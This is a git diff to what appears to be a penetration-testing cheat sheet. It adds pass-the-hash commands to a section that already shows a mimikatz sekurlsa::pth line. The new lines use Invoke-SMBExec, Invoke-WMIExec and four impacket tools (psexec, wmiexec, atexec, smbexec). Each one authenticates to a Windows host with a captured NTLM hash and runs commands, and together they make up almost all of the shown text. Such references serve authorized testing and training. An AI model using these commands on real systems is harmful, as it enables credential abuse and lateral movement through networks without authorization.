@@ -637,7 +637,17 @@ C:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<RC4 has
 
 ```
 PS C:\> Import-Module .\Invoke-TheHash.psd1
-PS C:\> Invoke-SMBExec -Target <IP address> -Domain <Domain Name> -Username <username> -Hash <hash> -Command "<command>" -Verbose
+PS C:\> Invoke-SMBExec -Target <IP address/Hostname> -Domain <Domain Name> -Username <username> -Hash <hash> -Command "<command>" -Verbose
+PS C:\> Invoke-WMIExec -Target <IP address/Hostname> -Domain <Domain Name> -Username <username> -Hash <hash> -Command "<command>" -Verbose
+```
+
+- Impacket (PTH)
+
+```
+$ impacket-psexec <username>@<IP address> -hashes :<hash>
+$ impacket-wmiexec <username>@<IP address> -hashes :<hash>
+$ impacket-atexec <username>@<IP address> -hashes :<hash>
+$ impacket-smbexec <username>@<IP address> -hashes :<hash>
 ```
 
 #5. - Privilege Escalation
